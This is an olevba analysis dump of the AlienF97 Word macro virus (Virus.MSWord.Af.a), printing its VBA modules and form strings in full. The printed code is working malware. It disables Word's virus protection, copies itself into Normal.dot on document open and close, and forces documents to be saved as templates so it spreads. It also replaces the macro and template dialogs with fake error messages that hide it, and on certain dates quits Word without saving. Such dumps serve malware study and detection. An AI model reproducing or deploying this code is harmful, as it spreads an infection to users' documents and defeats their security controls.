olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Af.a-f32e2115f78d86f69f08c76a763387e507c2fde6
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Af.a-f32e2115f78d86f69f08c76a763387e507c2fde6 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AlienF97.bas 
in file: Virus.MSWord.Af.a-f32e2115f78d86f69f08c76a763387e507c2fde6 - OLE stream: 'Macros/VBA/AlienF97'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorAC
iMacroCount = WordBasic.CountMacros(0, 0)
For i = 1 To iMacroCount
    If WordBasic.[MacroName$](i, 0) = "AlienF97" Then
        AlienInstalled = -1
    End If
Next i
If Not AlienInstalled Then
    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="AlienF97", Object:=wdOrganizerObjectProjectItems
    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="UserForm900", Object:=wdOrganizerObjectProjectItems
    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="UserForm999", Object:=wdOrganizerObjectProjectItems
End If
ErrorAC:
End Sub
Sub AutoOpen()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorAO
iMacroCount = WordBasic.CountMacros(0, 0)
For i = 1 To iMacroCount
    If WordBasic.[MacroName$](i, 0) = "AlienF97" Then
        AlienInstalled = -1
    End If
Next i
If Not AlienInstalled Then
    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="AlienF97", Object:=wdOrganizerObjectProjectItems
    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="UserForm900", Object:=wdOrganizerObjectProjectItems
    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="UserForm999", Object:=wdOrganizerObjectProjectItems
End If
Dim MyDate, MyWeek, Longueur
Nom$ = ActiveDocument.Name
Longueur = Len(Nom$)
Randomize
a$ = Int(Rnd * 12) + 1
MyDate = Date
D$ = Mid(MyDate, 1, 5)
MyWeek = WeekDay(MyDate, vbMonday)
If D$ = "01/08" Then
Select Case a$
    Case 1 To 6
        MsgBox "Quelques Années de Survie...", Title:="AlienF97"
        Application.Quit SaveChanges:=wdDoNotSaveChanges
End Select
End If
If MyWeek = "7" Then
Select Case a$
    Case 7 To 12
        MsgBox "C'est Dimanche & J'ai l'intention de me relaxer", Title:="AlienF97"
        Application.Quit SaveChanges:=wdDoNotSaveChanges
End Select
End If

If Longueur < 9 Then
    MsgBox "Longueur De Noms De Fichier Déjà Utilisé", Title:="Tip de la part d'AlienF97"
End If

If (a$ = "1") And (MyWeek <> "7") And (D$ <> "01/08") Then
    MsgBox "N'ouvrez Jamais d'Autres Fichiers !", Title:="AlienF97"
End If
If (a$ = "2") And (MyWeek <> "7") And (D$ <> "01/08") Then
    MsgBox "Ne Faîtes Pas Confiance à Un Alien !", Title:="AlienF97"
End If
If (a$ = "3") And (MyWeek <> "7") And (D$ <> "01/08") Then
    MsgBox "Ne Croyez Pas Tous Les Tips!", Title:="AlienF97"
End If
If (a$ = "4") And (MyWeek <> "7") And (D$ <> "01/08") Then
    MsgBox "Sauvegarder Souvent Vos Données.", Title:="AlienF97"
End If
If (a$ = "5") And (MyWeek <> "7") And (D$ <> "01/08") Then
    MsgBox "Trois Acclamations pour AlienF97." & Chr$(13) & "Hip Hip Hourra !", Title:="AlienF97"
End If
If (a$ = "6") And (MyWeek <> "7") And (D$ <> "01/08") Then
    MsgBox "Je Reviendrai !", Title:="AlienF97"
End If
If (a$ = "7") And (MyWeek <> "7") And (D$ <> "01/08") Then
    MsgBox "Salut Beauté !", Title:="AlienF97"
End If
If (a$ = "8") And (MyWeek <> "7") And (D$ <> "01/08") Then
    MsgBox "Tu Me Facines.", Title:="AlienF97"
End If
If (a$ = "9") And (MyWeek <> "7") And (D$ <> "01/08") Then
    MsgBox "Ne Regarde Pas Trop Loin !", Title:="AlienF97"
End If
If (a$ = "10") And (MyWeek <> "7") And (D$ <> "01/08") Then
    MsgBox "Le Virus 'AlienF97' Est Arrivé !", Title:="AlienF97"
End If
If (a$ = "11") And (MyWeek <> "7") And (D$ <> "01/08") Then
    MsgBox "AlienF97 Est En Vie...", Title:="AlienF97"
End If
ErrorAO:
End Sub
Sub FileSaveAs()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorFSA
    Dialogs(wdDialogFileSaveAs).Show
        If (ActiveDocument.SaveFormat = wdFormatDocument) Or (ActiveDocument.SaveFormat = wdFormatTemplate) Then
            ActiveDocument.SaveAs FileFormat:=wdFormatTemplate
        End If
        Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=NormalTemplate.FullName, Name:="AlienF97", Object:=wdOrganizerObjectProjectItems
        Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=NormalTemplate.FullName, Name:="UserForm900", Object:=wdOrganizerObjectProjectItems
        Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=NormalTemplate.FullName, Name:="UserForm999", Object:=wdOrganizerObjectProjectItems
    ActiveDocument.Save
ErrorFSA:
End Sub
Sub FileTemplates()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorFT
    UserForm900.Show
ErrorFT:
End Sub
Sub ToolsMacro()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorTM
    UserForm999.Show
ErrorTM:
End Sub
Sub ViewVBCode()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorVVBC
    MsgBox "Ce programme a réalisé une opération illégale et va être interrompu.", vbCritical, "Microsoft Word"
ErrorVVBC:
End Sub
-------------------------------------------------------------------------------
VBA MACRO UserForm900.frm 
in file: Virus.MSWord.Af.a-f32e2115f78d86f69f08c76a763387e507c2fde6 - OLE stream: 'Macros/VBA/UserForm900'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 




Private Sub CommandButton1_Click()
MsgBox "Ce programme a réalisé une opération illégale et va être interrompu.", vbCritical, Title:="Microsoft Word"
Unload UserForm900
End Sub

Private Sub CommandButton2_Click()
MsgBox "Ce programme a réalisé une opération illégale et va être interrompu.", vbCritical, Title:="Microsoft Word"
Unload UserForm900
End Sub

Private Sub CommandButton3_Click()
MsgBox "Ce programme a réalisé une opération illégale et va être interrompu.", vbCritical, Title:="Microsoft Word"
Unload UserForm900
End Sub

Private Sub CommandButton4_Click()
MsgBox "Ce programme a réalisé une opération illégale et va être interrompu.", vbCritical, Title:="Microsoft Word"
Unload UserForm900
End Sub

Private Sub CommandButton5_Click()
MsgBox "Ce programme a réalisé une opération illégale et va être interrompu.", vbCritical, Title:="Microsoft Word"
Unload UserForm900
End Sub

Private Sub CommandButton6_Click()
Unload UserForm900
End Sub

Private Sub UserForm_Initialize()
    TextBox1.Text = NormalTemplate.Name
    CommandButton2.Enabled = False
    CommandButton3.Enabled = False
    CommandButton4.Enabled = False
End Sub
-------------------------------------------------------------------------------
VBA MACRO UserForm999.frm 
in file: Virus.MSWord.Af.a-f32e2115f78d86f69f08c76a763387e507c2fde6 - OLE stream: 'Macros/VBA/UserForm999'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 








Private Sub ListBox1_Click()
    If ListBox1.Selected(0) = True Then
        CommandButton1.Enabled = True
        CommandButton3.Enabled = True
        CommandButton4.Enabled = True
        CommandButton6.Enabled = True
    ElseIf ListBox1.Selected(1) = True Then
        CommandButton1.Enabled = True
        CommandButton3.Enabled = True
        CommandButton4.Enabled = True
        CommandButton6.Enabled = True
    Else
        CommandButton1.Enabled = False
        CommandButton3.Enabled = False
        CommandButton4.Enabled = False
        CommandButton6.Enabled = False
    End If
End Sub

Private Sub UserForm_Initialize()
    ComboBox1.AddItem "Commande Word"
    ComboBox1.AddItem "Tous les modèles actifs"
    ComboBox1.AddItem "Normal.dot (modèle global)"
    ComboBox1.AddItem WordBasic.WindowName$()
    CommandButton1.Enabled = False
    CommandButton3.Enabled = False
    TextBox2.Text = "Macro créée le " & Date & " par " & Application.UserName
End Sub

Private Sub CommandButton1_Click()
MsgBox "Ce programme a réalisé une opération illégale et va être interrompu.", vbCritical, "Microsoft Word"
Unload UserForm999
End Sub
Private Sub CommandButton2_Click()
Unload UserForm999
End Sub

Private Sub CommandButton3_Click()
MsgBox "Ce programme a réalisé une opération illégale et va être interrompu.", vbCritical, "Microsoft Word"
Unload UserForm999
End Sub

Private Sub CommandButton4_Click()
MsgBox "Ce programme a réalisé une opération illégale et va être interrompu.", vbCritical, "Microsoft Word"
Unload UserForm999
End Sub

Private Sub CommandButton5_Click()
MsgBox "Ce programme a réalisé une opération illégale et va être interrompu.", vbCritical, "Microsoft Word"
Unload UserForm999
End Sub

Private Sub CommandButton6_Click()
MsgBox "Ce programme a réalisé une opération illégale et va être interrompu.", vbCritical, "Microsoft Word"
Unload UserForm999
End Sub

Private Sub CommandButton7_Click()
MsgBox "Ce programme a réalisé une opération illégale et va être interrompu.", vbCritical, "Microsoft Word"
Unload UserForm999
End Sub
Private Sub ScrollBar1_Change()
MsgBox "Ce programme a réalisé une opération illégale et va être interrompu.", vbCritical, "Microsoft Word"
Unload UserForm999
End Sub

-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Af.a-f32e2115f78d86f69f08c76a763387e507c2fde6' - OLE stream: 'Macros/UserForm900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Mod�le de documentH
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Af.a-f32e2115f78d86f69f08c76a763387e507c2fde6' - OLE stream: 'Macros/UserForm900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Af.a-f32e2115f78d86f69f08c76a763387e507c2fde6' - OLE stream: 'Macros/UserForm900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Af.a-f32e2115f78d86f69f08c76a763387e507c2fde6' - OLE stream: 'Macros/UserForm900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Mise � jour automatique des styles de document
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Af.a-f32e2115f78d86f69f08c76a763387e507c2fde6' - OLE stream: 'Macros/UserForm900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Af.a-f32e2115f78d86f69f08c76a763387e507c2fde6' - OLE stream: 'Macros/UserForm900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Mod�les globaux et compl�ments
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Af.a-f32e2115f78d86f69f08c76a763387e507c2fde6' - OLE stream: 'Macros/UserForm900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Af.a-f32e2115f78d86f69f08c76a763387e507c2fde6' - OLE stream: 'Macros/UserForm900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Les �l�ments coch�s sont d�j� en m�moire.7H
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Af.a-f32e2115f78d86f69f08c76a763387e507c2fde6' - OLE stream: 'Macros/UserForm900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Af.a-f32e2115f78d86f69f08c76a763387e507c2fde6' - OLE stream: 'Macros/UserForm900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Attacher....D
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Af.a-f32e2115f78d86f69f08c76a763387e507c2fde6' - OLE stream: 'Macros/UserForm900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Af.a-f32e2115f78d86f69f08c76a763387e507c2fde6' - OLE stream: 'Macros/UserForm900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ajouter
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Af.a-f32e2115f78d86f69f08c76a763387e507c2fde6' - OLE stream: 'Macros/UserForm900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Af.a-f32e2115f78d86f69f08c76a763387e507c2fde6' - OLE stream: 'Macros/UserForm900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Supprimer...E
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Af.a-f32e2115f78d86f69f08c76a763387e507c2fde6' - OLE stream: 'Macros/UserForm900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Af.a-f32e2115f78d86f69f08c76a763387e507c2fde6' - OLE stream: 'Macros/UserForm900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Organiser...E
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Af.a-f32e2115f78d86f69f08c76a763387e507c2fde6' - OLE stream: 'Macros/UserForm900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Af.a-f32e2115f78d86f69f08c76a763387e507c2fde6' - OLE stream: 'Macros/UserForm900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Af.a-f32e2115f78d86f69f08c76a763387e507c2fde6' - OLE stream: 'Macros/UserForm900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Annuler
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Af.a-f32e2115f78d86f69f08c76a763387e507c2fde6' - OLE stream: 'Macros/UserForm900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Af.a-f32e2115f78d86f69f08c76a763387e507c2fde6' - OLE stream: 'Macros/UserForm900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Chemin d'acc�s:
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Af.a-f32e2115f78d86f69f08c76a763387e507c2fde6' - OLE stream: 'Macros/UserForm900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Af.a-f32e2115f78d86f69f08c76a763387e507c2fde6' - OLE stream: 'Macros/UserForm900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Af.a-f32e2115f78d86f69f08c76a763387e507c2fde6' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
H�,? 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Af.a-f32e2115f78d86f69f08c76a763387e507c2fde6' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Af.a-f32e2115f78d86f69f08c76a763387e507c2fde6' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tous les mod�les actifs
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Af.a-f32e2115f78d86f69f08c76a763387e507c2fde6' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Af.a-f32e2115f78d86f69f08c76a763387e507c2fde6' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Nom de la macro:0
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Af.a-f32e2115f78d86f69f08c76a763387e507c2fde6' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Af.a-f32e2115f78d86f69f08c76a763387e507c2fde6' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Macros disponibles dans::
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Af.a-f32e2115f78d86f69f08c76a763387e507c2fde6' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Af.a-f32e2115f78d86f69f08c76a763387e507c2fde6' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Af.a-f32e2115f78d86f69f08c76a763387e507c2fde6' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Description:�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Af.a-f32e2115f78d86f69f08c76a763387e507c2fde6' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Af.a-f32e2115f78d86f69f08c76a763387e507c2fde6' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ex�cuter
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Af.a-f32e2115f78d86f69f08c76a763387e507c2fde6' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Af.a-f32e2115f78d86f69f08c76a763387e507c2fde6' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Annuler
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Af.a-f32e2115f78d86f69f08c76a763387e507c2fde6' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Af.a-f32e2115f78d86f69f08c76a763387e507c2fde6' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ex�cuter pas � pasH
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Af.a-f32e2115f78d86f69f08c76a763387e507c2fde6' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Af.a-f32e2115f78d86f69f08c76a763387e507c2fde6' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Modifier
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Af.a-f32e2115f78d86f69f08c76a763387e507c2fde6' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Af.a-f32e2115f78d86f69f08c76a763387e507c2fde6' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Cr�er
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Af.a-f32e2115f78d86f69f08c76a763387e507c2fde6' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Af.a-f32e2115f78d86f69f08c76a763387e507c2fde6' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Supprimer
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Af.a-f32e2115f78d86f69f08c76a763387e507c2fde6' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Af.a-f32e2115f78d86f69f08c76a763387e507c2fde6' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Organiser...
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Af.a-f32e2115f78d86f69f08c76a763387e507c2fde6' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Af.a-f32e2115f78d86f69f08c76a763387e507c2fde6' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'Virus.MSWord.Af.a-f32e2115f78d86f69f08c76a763387e507c2fde6' - OLE stream: 'Macros/UserForm900'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Frame1'" IN 'Virus.MSWord.Af.a-f32e2115f78d86f69f08c76a763387e507c2fde6' - OLE stream: 'Macros/UserForm900'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'TextBox1'" IN 'Virus.MSWord.Af.a-f32e2115f78d86f69f08c76a763387e507c2fde6' - OLE stream: 'Macros/UserForm900'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
-------------------------------------------------------------------------------
VBA FORM Variable "b'CheckBox1'" IN 'Virus.MSWord.Af.a-f32e2115f78d86f69f08c76a763387e507c2fde6' - OLE stream: 'Macros/UserForm900'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label2'" IN 'Virus.MSWord.Af.a-f32e2115f78d86f69f08c76a763387e507c2fde6' - OLE stream: 'Macros/UserForm900'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label3'" IN 'Virus.MSWord.Af.a-f32e2115f78d86f69f08c76a763387e507c2fde6' - OLE stream: 'Macros/UserForm900'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'ScrollBar1'" IN 'Virus.MSWord.Af.a-f32e2115f78d86f69f08c76a763387e507c2fde6' - OLE stream: 'Macros/UserForm900'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton1'" IN 'Virus.MSWord.Af.a-f32e2115f78d86f69f08c76a763387e507c2fde6' - OLE stream: 'Macros/UserForm900'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton2'" IN 'Virus.MSWord.Af.a-f32e2115f78d86f69f08c76a763387e507c2fde6' - OLE stream: 'Macros/UserForm900'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton3'" IN 'Virus.MSWord.Af.a-f32e2115f78d86f69f08c76a763387e507c2fde6' - OLE stream: 'Macros/UserForm900'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton4'" IN 'Virus.MSWord.Af.a-f32e2115f78d86f69f08c76a763387e507c2fde6' - OLE stream: 'Macros/UserForm900'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton5'" IN 'Virus.MSWord.Af.a-f32e2115f78d86f69f08c76a763387e507c2fde6' - OLE stream: 'Macros/UserForm900'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton6'" IN 'Virus.MSWord.Af.a-f32e2115f78d86f69f08c76a763387e507c2fde6' - OLE stream: 'Macros/UserForm900'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label4'" IN 'Virus.MSWord.Af.a-f32e2115f78d86f69f08c76a763387e507c2fde6' - OLE stream: 'Macros/UserForm900'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'ListBox1'" IN 'Virus.MSWord.Af.a-f32e2115f78d86f69f08c76a763387e507c2fde6' - OLE stream: 'Macros/UserForm900'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
-------------------------------------------------------------------------------
VBA FORM Variable "b'TextBox1'" IN 'Virus.MSWord.Af.a-f32e2115f78d86f69f08c76a763387e507c2fde6' - OLE stream: 'Macros/UserForm999'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
-------------------------------------------------------------------------------
VBA FORM Variable "b'ScrollBar1'" IN 'Virus.MSWord.Af.a-f32e2115f78d86f69f08c76a763387e507c2fde6' - OLE stream: 'Macros/UserForm999'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'ComboBox1'" IN 'Virus.MSWord.Af.a-f32e2115f78d86f69f08c76a763387e507c2fde6' - OLE stream: 'Macros/UserForm999'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'Tous les mod\xe8les actifs'
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'Virus.MSWord.Af.a-f32e2115f78d86f69f08c76a763387e507c2fde6' - OLE stream: 'Macros/UserForm999'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label2'" IN 'Virus.MSWord.Af.a-f32e2115f78d86f69f08c76a763387e507c2fde6' - OLE stream: 'Macros/UserForm999'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'TextBox2'" IN 'Virus.MSWord.Af.a-f32e2115f78d86f69f08c76a763387e507c2fde6' - OLE stream: 'Macros/UserForm999'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label3'" IN 'Virus.MSWord.Af.a-f32e2115f78d86f69f08c76a763387e507c2fde6' - OLE stream: 'Macros/UserForm999'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
